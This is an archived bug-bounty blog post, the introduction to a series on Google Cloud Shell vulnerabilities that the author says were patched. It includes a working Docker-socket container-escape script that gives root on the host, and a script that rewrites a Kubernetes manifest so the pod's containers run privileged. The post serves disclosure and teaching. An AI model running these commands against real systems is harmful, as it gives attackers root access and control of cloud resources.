---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-16_4-google-cloud-shell-bugs-explained.md
original_filename: 2019-12-16_4-google-cloud-shell-bugs-explained.md
title: 4 Google Cloud Shell bugs explained
category: documents
detected_topics:
- command-injection
- cloud-security
tags:
- imported
- documents
- command-injection
- cloud-security
language: en
raw_sha256: 42e7afba566b383a20064aedb15b06aed52a8c3f8b62ccbe53cb345f998f2163
text_sha256: 9024196bf3fb78bd22a42e41d87ab5830dece47cf7ba180db0bc00161f37794d
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# 4 Google Cloud Shell bugs explained

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-16_4-google-cloud-shell-bugs-explained.md
- Source Type: markdown
- Detected Topics: command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `42e7afba566b383a20064aedb15b06aed52a8c3f8b62ccbe53cb345f998f2163`
- Text SHA256: `9024196bf3fb78bd22a42e41d87ab5830dece47cf7ba180db0bc00161f37794d`


## Content

---
title: "4 Google Cloud Shell bugs explained"
page_title: "4 Google Cloud Shell bugs explained – Offensi"
url: "https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/"
final_url: "https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/"
authors: ["wtm@offensi.com (@wtm_offensi)"]
programs: ["Google"]
bugs: ["RCE"]
publication_date: "2019-12-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4887
---

#### Quick navigation

  * Introduction (this page)
  * [Bug #1](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-1/) – The Python language server
  * [Bug #2](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-2) – A custom Cloud Shell image
  * [Bug #3](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-3) – Git clone
  * [Bug #4](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-4/) – Go and get pwned

  
  

**Note** : The vulnerabilities that are discussed in this series of posts and in [LiveOverflow](https://twitter.com/LiveOverflow)‘s video were patched quickly and properly by Google (a long time ago). We support responsible disclosure.

## **Introduction**

In 2019 i spent a significant amount of my time hunting for bugs in the Google Cloud Platform. While the Google Cloud Platform is known to be a tough target among bughunters, i was lucky enough to have some modest success in finding bugs in one of it’s services, the Google Cloud Shell.  
  
In July i was therefore approached by Eduardo of the [Google VRP](https://g.co/vrp). He asked me if i was willing to demonstrate a Cloud Shell bug to [LiveOverflow](https://twitter.com/liveoverflow) as part of an interview for a video, on one precondition though: the bug had to be unfixed by Google! LiveOverflow did a great job in polishing up my bug, the result of which can be seen [here](https://www.youtube.com/watch?v=E-P9USG6kLs).

Later on Google invited me to attend the [BugSWAT](https://twitter.com/hashtag/bugswat) event in October at Google’s HQ in London. At this event i was able to share some of my findings to my fellow bughunters and Googlers by giving a talk titled “4 Cloudshell bugs in 25 minutes”. 

In total i discovered 9 vulnerabilities in the Google Cloud Shell. In this series of posts i will uncover and explain 4 of them, ending with my most favorite one. 

#### **About Google Cloud Shell**

Google Cloud Shell provides administrators and developers with a quick way to access cloud resources. It provides users with a Linux shell that is accessible via your browser. This shell comes with pre-installed tools needed to start working on your Google Cloud Platform project, such as gcloud, Docker, Python, vim, Emacs and Theia, a Powerful opensource IDE .

Users of the Google Cloud Platform can launch a Cloud Shell instance via the Cloud Console or simply by visiting this url: [https://console.cloud.google.com/home/dashboard?cloudshell=true&project=your_project_id](https://console.cloud.google.com/home/dashboard?cloudshell=true&project_id=your_project_id)

When the Cloud Shell instance is done starting a terminal window is presented to the user. In the screenshot below you can see what that looks like. Noteworthy is the fact that the gcloud client is already authenticated. If an attacker is able to compromise your Cloud Shell, it can access all your GCP resources. 

![](https://i0.wp.com/offensi.com/wp-content/uploads/2019/12/cloudshell-login.png?resize=766%2C173&ssl=1)

#### **Escaping the Cloud Shell container**

When inspecting the running processes with ‘ps’ inside the Cloud Shell it looks like that we might be trapped inside a Docker container. There is only a small number of processes running.

To confirm our suspicion we can inspect the /proc filesystem. Docker Engine for Linux makes use of so called control groups ([cgroups](http://man7.org/linux/man-pages/man7/cgroups.7.html)). A cgroup limits an application to a specific set of resources. For example, by using cgroups Docker can limit the amount of memory that is allocated to a container. In the case of Cloud Shell, i identified the use of Kubernetes and Docker by inspecting the contents of /proc/1/environ, as can be seen in the screenshot below. 

![](https://i0.wp.com/offensi.com/wp-content/uploads/2019/12/cgroups.png?resize=726%2C451&ssl=1)

At this point i knew for sure i was trapped inside a container. If i wanted to learn more about the inner workings of Cloud Shell i needed to find a way to escape to the host. Luckily, after exploring the filesystem i noticed that there were 2 Docker unix sockets available. One in ‘ _/run/docker.sock_ ‘, which is the default path for our Docker client running inside the Cloud Shell (Docker inside Docker), the second one in ‘ _/google/host/var/run/docker.sock_ ‘. 

The pathname of the second Unix socket reveals that this is the host based Docker socket. Anyone who can communicate with a host based Docker socket can easily escape the container and gain root access on the host at the same time. 

Using the script below i escaped to the host. 
  
  
  # create a privileged container with host root filesystem mounted - wtm@offensi.com
  sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
  sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
  sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
  sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
  

#### **The bigger picture**

Now that i had root access on the host, i started exploring the configuration of Kubernetes, which is stored under ‘ _/etc/kubernetes/manifests/_ ‘ in YAML files. Based on the Kubernetes configuration and several hours of inspecting traffic with tcpdump i now had a better overview of how the Cloud Shell works. I created a quick and dirty high-level diagram to keep a better overview. 

![](https://i0.wp.com/offensi.com/wp-content/uploads/2019/12/diagram.png?resize=766%2C786&ssl=1)

#### **Reconfigure Kubernetes**

Most of the containers inside the Kubernetes pods are running unprivileged by default. Because of this we are unable to use debugging tools like gdb and strace inside these containers. Gdb and strace rely on the [ptrace()](http://man7.org/linux/man-pages/man2/ptrace.2.html) syscall and require a minimum capability of SYS_PTRACE. It’s easier to run all containers in privileged mode, instead of granting them the SYS_PTRACE capability. Therefore i wrote a script to reconfigure the ‘cs-6000’ pod. 

The script below writes a new cs-6000.yaml config and links the old config to /dev/null. After running it you will find that all containers inside the pod will automatically reboot. Now all containers run in privileged mode and we can start debugging. 
  
  
  #!/bin/sh
  # wtm@offensi.com
  
  # write new manifest
  cat /etc/kubernetes/manifests/cs-6000.yaml | sed s/"  'securityContext': \!\!null 'null'"/\
  "  'securityContext':\n"\
  "  'privileged': \!\!bool 'true'\n"\
  "  'procMount': \!\!null 'null'\n"\
  "  'runAsGroup': \!\!null 'null'\n"\
  "  'runAsUser': \!\!null 'null'\n"\
  "  'seLinuxOptions': \!\!null 'null'\n"/g > /tmp/cs-6000.yaml
  
  # replace old manifest with symlink
  mv /tmp/cs-6000.yaml /etc/kubernetes/manifests/cs-6000.modified
  ln -fs /dev/null /etc/kubernetes/manifests/cs-6000.yaml

#### Additional **resources**

  * My github repository with [Cloud Shell tools](https://github.com/offensi/LiveOverflow-cloudshell-stuff)
  * [LiveOverflow’s video](https://www.youtube.com/watch?v=E-P9USG6kLs) about bughunting in Cloud Shell
  * Official Cloud Shell [documentation](https://cloud.google.com/shell/docs/) by Google
  * Docker [documentation](https://docs.docker.com/)
  * Kubernetes [documentation](https://kubernetes.io/docs/home/)

[**Continue reading: Bug #1 – The Python language server**](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-1/)

[Follow wtm](https://twitter.com/wtm_offensi?ref_src=twsrc%5Etfw)
